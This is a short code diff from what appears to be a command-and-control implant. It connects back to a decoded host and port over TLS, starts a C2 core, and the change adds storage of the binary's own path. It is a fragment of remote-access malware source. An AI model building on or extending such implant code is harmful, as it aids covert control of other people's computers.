@@ -68,7 +68,7 @@ int connectTo(NSString *hostPart, int portPart)
     return sock;
 }
 
-int main(int argc, const char * argv[]) {
+int main(int argc, const char *argv[]) {
     int sock;
 
     NSString *decodedString;
@@ -99,6 +99,7 @@ int main(int argc, const char * argv[]) {
         sock = connectTo(pairedData[0], [pairedData[1] intValue]);
 
         c2_add_sock(&c2, 0, sock, NET_PROTO_TLS);
+        c2->path = realpath(argv[0], NULL);
 
         core = core_create(c2);
         core_start(core);
